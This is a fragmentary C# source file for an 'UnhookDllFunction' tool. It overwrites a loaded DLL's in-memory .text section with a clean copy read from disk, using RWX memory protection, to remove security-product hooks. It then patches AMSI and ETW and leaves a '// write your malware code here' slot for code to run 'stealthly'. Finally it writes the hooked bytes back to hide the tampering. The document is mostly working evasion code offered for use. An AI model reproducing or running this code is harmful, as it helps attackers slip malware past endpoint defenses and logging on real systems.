...
public class UnhookDllFunction
{

    public static void Unhooker(string DLLname)
    {
        Console.WriteLine("Started unhooking {0}", DLLname);
        IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
        ...
        try
        {
            ...
            Console.WriteLine("{0} is located at {1}", DLLname, DLLFullPath);
        }
        catch
        {
        ...
        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++)
        {
            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text")
            {
                ...
                if (assemblyBytes != null && assemblyBytes.Length > 0)
                {
                    ...
                    if (ModuleHandleInMemory != IntPtr.Zero)
                    {
                        ...
                        if (updateMemoryProtection)
                        {
                            ...
                            {
                                Console.WriteLine("Patched API bytes don't match the desired API bytes, API is probably still hooked.");
                            }
                            else
                            {
                ...
                {
                    Console.WriteLine("Failed to read the original DLL from disk, check permissions.");
                }
            }
        }
    }
    ...
    private static void PatchDLLTextOnMem(byte[] DLLBytes, string DLLname)
    {
        ...
        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++)
        {
            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text")
            {
                ...
                bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref DLLBytesSize, (UInt32)0x40, ref oldProtect);
                if (updateMemoryProtection)
                {
                    Marshal.Copy(DLLBytes, 0, InMemoryTextSectionPointer, DLLBytes.Length);
                    UInt32 newProtect = 0;
                    DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref DLLBytesSize, oldProtect, ref newProtect);
                }
                else
                {
                    Console.WriteLine("Failed to update memory protection setting.");
    ...
    static void Usage()
    {
        Console.WriteLine("Usage: UnhookDllFunction.exe <DLL Name>");
    }
    ...
    public static void Main(string[] argv)
    {
        ...
        // DLL name from argv
        string dllName = argv[0];

        
        // Create byte array of the old hooked DLL in memory
        byte[] hookedDllBytes = new byte[0];


        // Save hooked-state of the DLL before unhooking
        try
        {
            SaveDLLTextFromMem(dllName, ref hookedDllBytes);
        }
        catch
        {
            Console.WriteLine("Couldn't find {0} in memory", dllName);
            Environment.Exit(0);
        }
        ...
        PatchAMSIAndETW.Entry();


        // write your malware code here
        Console.WriteLine("This code is been executed stealthly B)");

        // Writing old code back to memory
        try
        {
            PatchDLLTextOnMem(hookedDllBytes, dllName);
        }
        catch
        {
            Console.WriteLine("Couldn't find {0} in memory", dllName);
